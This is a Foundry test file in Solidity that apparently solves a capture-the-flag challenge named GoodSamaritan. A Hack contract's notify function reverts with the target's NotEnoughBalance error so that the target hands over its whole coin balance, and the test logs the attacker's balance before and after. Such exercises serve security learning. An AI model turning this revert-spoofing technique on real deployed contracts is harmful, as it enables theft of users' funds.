// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/Target.sol";

contract Hack {
	GoodSamaritan man;
	error NotEnoughBalance();

	constructor(address _man) {
		man = GoodSamaritan(_man);
		man.requestDonation();
	}

	function isContract() public returns (bool) {
		return true;
	}

	function notify(uint256 amount) public pure {
		if (amount <= 10) revert NotEnoughBalance();
	}
}

contract CounterTest is Test {
	address player = makeAddr("0xH4ck3r");
	address admin = makeAddr("0x4dM1N");
	GoodSamaritan man;
	Hack hack;

	Coin coin;
	Wallet wallet;

    function setUp() public {
		vm.deal(admin, 100 ether);
		vm.deal(player, 100 ether);
		vm.deal(address(hack), 0.001 ether);
		vm.startPrank(admin);
		man = new GoodSamaritan();
		coin = man.coin();
		wallet = man.wallet();

		hack = new Hack(address(man));
		vm.stopPrank();
	}

	function test_basics() public {
		vm.prank(player);
		console.log(coin.balances(address(hack)));
		vm.startPrank(address(hack));
		man.requestDonation();
		console.log(coin.balances(address(hack)));
	}
}
